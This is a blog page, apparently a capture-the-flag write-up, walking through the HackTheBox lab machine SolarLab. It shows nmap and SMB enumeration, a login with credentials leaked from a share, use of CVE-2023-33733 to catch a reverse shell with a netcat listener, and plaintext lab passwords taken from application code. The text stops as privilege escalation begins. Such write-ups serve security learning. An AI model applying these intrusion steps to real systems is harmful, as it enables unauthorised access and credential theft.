@@ -1,0 +1,865 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="Foued SAIDI">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://foued-saidi.tech/2024/09/19/hackthebox-solarlab/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="OverviewSolarLab is a medium-difficulty Windows machine from HackTheBox, it initially deals sensitive information leak through SMB that allows us dashboard access to ReportHub via CVE-2023-33733 for o">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hackthebox: SolarLab">
+<meta property="og:url" content="http://foued-saidi.tech/2024/09/19/Hackthebox-SolarLab/index.html">
+<meta property="og:site_name" content="Foued Saidi&#39;s Blog">
+<meta property="og:description" content="OverviewSolarLab is a medium-difficulty Windows machine from HackTheBox, it initially deals sensitive information leak through SMB that allows us dashboard access to ReportHub via CVE-2023-33733 for o">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/SolarLab/SolarLab.png">
+<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/SolarLab/docx.png">
+<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/SolarLab/login.png">
+<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/SolarLab/login1.png">
+<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/SolarLab/cve.png">
+<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/SolarLab/openfire.png">
+<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/SolarLab/openfire1.png">
+<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/SolarLab/openfire2.png">
+<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/SolarLab/openfire3.png">
+<meta property="og:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/SolarLab/openfire4.png">
+<meta property="article:published_time" content="2024-09-19T15:50:01.000Z">
+<meta property="article:modified_time" content="2024-09-19T19:16:41.609Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://foued-saidi.tech/images/HackTheBox/Machines/SolarLab/SolarLab.png">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/logo.png" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/logo.png">
+    <meta name="theme-color" content="#5618ff">
+    <link rel="shortcut icon" href="/images/logo.png">
+    <!--- Page Info-->
+    
+    <title>
+        
+            Hackthebox: SolarLab -
+        
+        Foued Saidi&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/assets/build/styles.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/fonts.css">
+
+    
+<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+
+    <!--- Inject Part-->
+    
+    <script id="hexo-configurations">
+    window.config = {"hostname":"foued-saidi.tech","root":"/","language":"en"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"5px","image_alignment":"center","image_caption":true,"link_icon":true,"title_alignment":"left"},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"Articles","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#5618ff","secondary":null},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Hello, I'm Foued SAIDI 👋","subtitle":{"text":["SecuriNets for life <3."],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":50,"backing_speed":50,"starting_delay":500,"backing_delay":1200,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"links":{"github":"https://github.com/kujen5","instagram":"https://www.instagram.com/saidi.foued/","zhihu":null,"twitter":"https://twitter.com/_kujen5","email":"foued.saidi.pro@gmail.com","linkedin":"https://www.linkedin.com/in/foued-saidi-pro/","facebook":"https://www.facebook.com/foued.saidi.980/"},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.5.2","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"},"About":{"icon":"fa-regular fa-user","submenus":{"Me":"/about","Github":"https://github.com/kujen5","LinkedIn":"https://www.linkedin.com/in/foued-saidi-pro/"}}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"links":{"Categories":{"path":"/categories","icon":"fa-regular fa-folder"}}},"article_date_format":"auto","categories":{"enable":true,"limit":2},"tags":{"enable":true,"limit":3}},"footerStart":"2023/12/22 00:00:00"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <span class="swup-progress-icon">
+            <i class="fa-solid fa-circle-notch fa-spin"></i>
+        </span>
+    
+</div>
+
+
+<main class="page-container" id="swup">
+
+    
+
+    <div class="main-content-container">
+
+
+        <div class="main-content-header">
+            <header class="navbar-container">
+    
+    <div class="navbar-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Foued Saidi&#39;s Blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-house"></i>
+                                        
+                                        HOME
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/archives"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-archive"></i>
+                                        
+                                        ARCHIVES
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/categories"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-folder"></i>
+                                        
+                                        CATEGORIES
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="has-dropdown" 
+                                    href="#" onClick="return false;">
+                                    
+                                        
+                                            <i class="fa-regular fa-user"></i>
+                                        
+                                        ABOUT&nbsp;<i class="fa-solid fa-chevron-down"></i>
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                                    <ul class="sub-menu">
+                                    
+                                        <li>
+                                        <a href="/about">ME
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="https://github.com/kujen5">GITHUB
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="https://www.linkedin.com/in/foued-saidi-pro/">LINKEDIN
+                                        </a>
+                                        </li>
+                                    
+                                    </ul>
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile drawer -->
+    <div class="navbar-drawer w-full absolute top-0 left-0 bg-background-color">
+        <ul class="drawer-navbar-list flex flex-col justify-start items-center">
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/"  >
+                             
+                                
+                                    <i class="fa-regular fa-house"></i>
+                                
+                                HOME
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/archives"  >
+                             
+                                
+                                    <i class="fa-regular fa-archive"></i>
+                                
+                                ARCHIVES
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/categories"  >
+                             
+                                
+                                    <i class="fa-regular fa-folder"></i>
+                                
+                                CATEGORIES
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group has-dropdown" 
+                        href="#" onClick="return false;">
+                            
+                                
+                                    <i class="fa-regular fa-user"></i>
+                                
+                                ABOUT&nbsp;<i class="group-hover:rotate-180 transition-transform fa-solid fa-chevron-down"></i>
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                              
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" href="/about">ME</a>
+                            </li>
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" target="_blank" rel="noopener" href="https://github.com/kujen5">GITHUB</a>
+                            </li>
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" target="_blank" rel="noopener" href="https://www.linkedin.com/in/foued-saidi-pro/">LINKEDIN</a>
+                            </li>
+                        
+                    
+            
+
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="post-page-container">
+    <div class="article-content-container">
+
+        <div class="article-title relative w-full">
+            
+                <div class="w-full flex items-center pt-6 justify-start">
+                    <h1 class="article-title-regular text-second-text-color text-4xl md:text-6xl font-bold px-2 sm:px-6 md:px-8 py-3">Hackthebox: SolarLab</h1>
+                </div>
+            
+            </div>
+
+        
+            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="/images/logo.png">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">Foued SAIDI</span>
+                        
+                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv2</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2024-09-19 16:50:01</span>
+        <span class="mobile">2024-09-19 16:50:01</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2024-09-19 20:16:41</span>
+            <span class="mobile">2024-09-19 20:16:41</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/Hackthebox/">Hackthebox</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+            <h3 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h3><p>SolarLab is a medium-difficulty Windows machine from HackTheBox, it initially deals sensitive information leak through SMB that allows us dashboard access to ReportHub via CVE-2023-33733 for our user flag. As for root, it deals with exposing the internal Openfire application and exploiting CVE-2023-32315 in order to gain remote code execution and decrypting some openfire database credentials to reach out Administrator. Fun box to tackle :)</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/SolarLab/SolarLab.png"
+                      alt="SolarLab-info-card"
+                ><figcaption>SolarLab-info-card</figcaption></figure></p>
+<h3 id="Reconnaissance"><a href="#Reconnaissance" class="headerlink" title="Reconnaissance"></a>Reconnaissance</h3><h4 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h4><div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\<span class="number">0</span>xkujen&gt; nmap <span class="literal">-A</span> <span class="literal">-Pn</span> <span class="literal">-p-</span> <span class="literal">-T4</span> <span class="number">10.129</span>.<span class="number">231.39</span></span><br><span class="line">Starting Nmap <span class="number">7.93</span> ( https://nmap.org ) at <span class="number">2024</span><span class="literal">-09-19</span> <span class="number">17</span>:<span class="number">12</span> W. Central Africa Standard Time</span><br><span class="line">NSOCK ERROR <span class="function">[<span class="number">0.2590</span><span class="type">s</span>] <span class="title">ssl_init_helper</span></span>(): OpenSSL legacy provider failed to load.</span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">10.129</span>.<span class="number">231.39</span></span><br><span class="line">Host is up (<span class="number">0.091</span>s latency).</span><br><span class="line">Not shown: <span class="number">65530</span> filtered tcp ports (no<span class="literal">-response</span>)</span><br><span class="line">PORT     STATE SERVICE       VERSION</span><br><span class="line"><span class="number">80</span>/tcp   open  http          nginx <span class="number">1.24</span>.<span class="number">0</span></span><br><span class="line">|_http<span class="literal">-title</span>: Did not follow redirect to http://solarlab.htb/</span><br><span class="line">|_http<span class="literal">-server-header</span>: nginx/<span class="number">1.24</span>.<span class="number">0</span></span><br><span class="line"><span class="number">135</span>/tcp  open  msrpc         Microsoft Windows RPC</span><br><span class="line"><span class="number">139</span>/tcp  open  netbios<span class="literal">-ssn</span>   Microsoft Windows netbios<span class="literal">-ssn</span></span><br><span class="line"><span class="number">445</span>/tcp  open  microsoft<span class="literal">-ds</span>?</span><br><span class="line"><span class="number">6791</span>/tcp open  http          nginx <span class="number">1.24</span>.<span class="number">0</span></span><br><span class="line">|_http<span class="literal">-title</span>: Did not follow redirect to http://report.solarlab.htb:<span class="number">6791</span>/</span><br><span class="line">|_http<span class="literal">-server-header</span>: nginx/<span class="number">1.24</span>.<span class="number">0</span></span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least <span class="number">1</span> open and <span class="number">1</span> closed port</span><br><span class="line">Device <span class="built_in">type</span>: general purpose</span><br><span class="line">Running (JUST GUESSING): Microsoft Windows XP|<span class="number">7</span> (<span class="number">89</span>%)</span><br><span class="line">OS CPE: cpe:/o:microsoft:windows_xp::sp3 cpe:/o:microsoft:windows_7</span><br><span class="line">Aggressive OS guesses: Microsoft Windows XP SP3 (<span class="number">89</span>%), Microsoft Windows XP SP2 (<span class="number">86</span>%), Microsoft Windows <span class="number">7</span> (<span class="number">85</span>%)</span><br><span class="line">No exact OS matches <span class="keyword">for</span> host (test conditions non<span class="literal">-ideal</span>).</span><br><span class="line">Network Distance: <span class="number">2</span> hops</span><br><span class="line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb2<span class="literal">-security-mode</span>:</span><br><span class="line">|   <span class="number">311</span>:</span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">| smb2<span class="literal">-time</span>:</span><br><span class="line">|   date: <span class="number">2024</span><span class="literal">-09-19T16</span>:<span class="number">23</span>:<span class="number">16</span></span><br><span class="line">|_  start_date: N/A</span><br><span class="line">|_c<span class="built_in">lock-skew</span>: <span class="number">3</span>m21s</span><br><span class="line"></span><br><span class="line">TRACEROUTE (<span class="keyword">using</span> port 135/tcp)</span><br><span class="line">HOP RTT        ADDRESS</span><br><span class="line"><span class="number">1</span>   <span class="number">2559.00</span> ms <span class="number">10.10</span>.<span class="number">16.1</span></span><br><span class="line"><span class="number">2</span>   <span class="number">2559.00</span> ms <span class="number">10.129</span>.<span class="number">231.39</span></span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">508.86</span> seconds</span><br></pre></td></tr></table></figure></div>
+
+<p>We can see that we have a web application running port 80 and 6791. The latter is redirecting us to <code>http://report.solarlab.htb:6791/</code>, so let’s go ahead and add that to our <code>/etc/hosts</code> file.</p>
+<h3 id="SMB-445"><a href="#SMB-445" class="headerlink" title="SMB - 445"></a>SMB - 445</h3><p>Since port 445 is open let’s check for any smb shares that we might be able to access:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ crackmapexec smb solarlab.htb -u Guest -p <span class="string">&quot;&quot;</span> --shares</span><br><span class="line">SMB         10.129.231.39   445    SOLARLAB         [*] Windows 10 / Server 2019 Build 19041 x64 (name:SOLARLAB) (domain:solarlab) (signing:False) (SMBv1:False)</span><br><span class="line">SMB         10.129.231.39   445    SOLARLAB         [+] solarlab\Guest: </span><br><span class="line">SMB         10.129.231.39   445    SOLARLAB         [+] Enumerated shares</span><br><span class="line">SMB         10.129.231.39   445    SOLARLAB         Share           Permissions     Remark</span><br><span class="line">SMB         10.129.231.39   445    SOLARLAB         -----           -----------     ------</span><br><span class="line">SMB         10.129.231.39   445    SOLARLAB         ADMIN$                          Remote Admin</span><br><span class="line">SMB         10.129.231.39   445    SOLARLAB         C$                              Default share</span><br><span class="line">SMB         10.129.231.39   445    SOLARLAB         Documents       READ            </span><br><span class="line">SMB         10.129.231.39   445    SOLARLAB         IPC$            READ            Remote IPC</span><br></pre></td></tr></table></figure></div>
+
+<p>We can see that we have a <code>Documents</code> share, let’s check it out:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/hackthebox/solarlab]</span><br><span class="line">└─$ smbclient //solarlab.htb/Documents -U Guest</span><br><span class="line">Password <span class="keyword">for</span> [WORKGROUP\Guest]:</span><br><span class="line">Try <span class="string">&quot;help&quot;</span> to get a list of possible commands.</span><br><span class="line">smb: \&gt; <span class="built_in">ls</span></span><br><span class="line">  .                                  DR        0  Fri Apr 26 10:47:14 2024</span><br><span class="line">  ..                                 DR        0  Fri Apr 26 10:47:14 2024</span><br><span class="line">  concepts                            D        0  Fri Apr 26 10:41:57 2024</span><br><span class="line">  desktop.ini                       AHS      278  Fri Nov 17 05:54:43 2023</span><br><span class="line">  details-file.xlsx                   A    12793  Fri Nov 17 07:27:21 2023</span><br><span class="line">  My Music                        DHSrn        0  Thu Nov 16 14:36:51 2023</span><br><span class="line">  My Pictures                     DHSrn        0  Thu Nov 16 14:36:51 2023</span><br><span class="line">  My Videos                       DHSrn        0  Thu Nov 16 14:36:51 2023</span><br><span class="line">  old_leave_request_form.docx         A    37194  Fri Nov 17 05:35:57 2023</span><br><span class="line"></span><br><span class="line">                7779839 blocks of size 4096. 1898529 blocks available</span><br><span class="line">smb: \&gt; mget *</span><br><span class="line">Get file desktop.ini? y</span><br><span class="line">getting file \desktop.ini of size 278 as desktop.ini (0.9 KiloBytes/sec) (average 0.9 KiloBytes/sec)</span><br><span class="line">Get file details-file.xlsx? y</span><br><span class="line">getting file \details-file.xlsx of size 12793 as details-file.xlsx (37.1 KiloBytes/sec) (average 19.7 KiloBytes/sec)</span><br><span class="line">Get file old_leave_request_form.docx? y</span><br><span class="line">getting file \old_leave_request_form.docx of size 37194 as old_leave_request_form.docx (67.6 KiloBytes/sec) (average 41.4 KiloBytes/sec)</span><br><span class="line">smb: \&gt; <span class="built_in">exit</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>We find a few files that we download and checking the excel sheet we find some intersting stuff:<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/SolarLab/docx.png"
+                      alt="Excel Sheet"
+                ><figcaption>Excel Sheet</figcaption></figure></p>
+<h3 id="Web-Application-http-report-solarlab-htb-6791"><a href="#Web-Application-http-report-solarlab-htb-6791" class="headerlink" title="Web Application - http://report.solarlab.htb:6791/"></a>Web Application - <a class="link"   target="_blank" rel="noopener" href="http://report.solarlab.htb:6791/" >http://report.solarlab.htb:6791/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></h3><p>We find a simple login page:<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/SolarLab/login.png"
+                      alt="Login"
+                ><figcaption>Login</figcaption></figure></p>
+<p>I also notice that the usernames we just acquired have different formats: <code>firstname.lastname</code>, <code>firtsnameL</code>.<br>So I tried to login using the usernames’ different formats and passwords, and got a valid login for <code>BlakeB:ThisCanB3typedeasily1@</code>, and we are in:<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/SolarLab/login1.png"
+                      alt="Dashboard"
+                ><figcaption>Dashboard</figcaption></figure></p>
+<p>Googling for some exploits withing <code>ReportHub</code>, I stumbled upon <a class="link"   target="_blank" rel="noopener" href="https://github.com/c53elyas/CVE-2023-33733" >CVE-2023-33733 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> which is a Code Execution Vulnerability in ReportLab python Library which will grant us a reverse shell on the system:<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/SolarLab/cve.png"
+                      alt="CVE"
+                ><figcaption>CVE</figcaption></figure></p>
+<p>And we are in:</p>
+<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\<span class="number">0</span>xkujen&gt; nc <span class="literal">-lvnp</span> <span class="number">9001</span></span><br><span class="line">listening on [<span class="type">any</span>] <span class="number">9001</span> ...</span><br><span class="line">connect to <span class="function">[<span class="number">10.10</span><span class="type">.x.x</span>] <span class="title">from</span></span> (UNKNOWN) [<span class="number">10.129</span><span class="type">.231.39</span>] <span class="number">50711</span></span><br><span class="line">Windows PowerShell running as user blake on SOLARLAB</span><br><span class="line">Copyright (C) <span class="number">2015</span> Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span> C:\Users\blake\Documents\app&gt;whoami</span><br><span class="line">solarlab\blake</span><br><span class="line"><span class="built_in">PS</span> C:\Users\blake\Documents\app&gt;</span><br><span class="line"><span class="built_in">PS</span> C:\Users\blake\documents\app&gt; <span class="built_in">cat</span> ../../desktop/user.txt</span><br><span class="line"><span class="number">0</span>c94cdfea50a5b******************</span><br><span class="line"><span class="built_in">PS</span> C:\Users\blake\documents\app&gt;</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="Privilege-Escalation-Root"><a href="#Privilege-Escalation-Root" class="headerlink" title="Privilege Escalation - Root"></a>Privilege Escalation - Root</h3><p>Checking for database files and user credentials, I stumbled into our 3 initial users passwords:</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">create_database</span>():</span><br><span class="line">    db.create_all()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> User.query.filter_by(username=<span class="string">&#x27;blakeb&#x27;</span>).first():</span><br><span class="line">        db.session.add(User(username=<span class="string">&#x27;blakeb&#x27;</span>, password=<span class="string">&#x27;ThisCanB3typedeasily1@&#x27;</span>))</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> User.query.filter_by(username=<span class="string">&#x27;claudias&#x27;</span>).first():</span><br><span class="line">        db.session.add(User(username=<span class="string">&#x27;claudias&#x27;</span>, password=<span class="string">&#x27;007poiuytrewq&#x27;</span>))</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> User.query.filter_by(username=<span class="string">&#x27;alexanderk&#x27;</span>).first():</span><br><span class="line">        db.session.add(User(username=<span class="string">&#x27;alexanderk&#x27;</span>, password=<span class="string">&#x27;HotP!fireguard&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    db.session.commit()</span><br></pre></td></tr></table></figure></div>
+
+<p>Maybe they can be useful in the future.</p>
+<p>Looking at our users directory we find an interesting <code>openfire</code> user:</p>
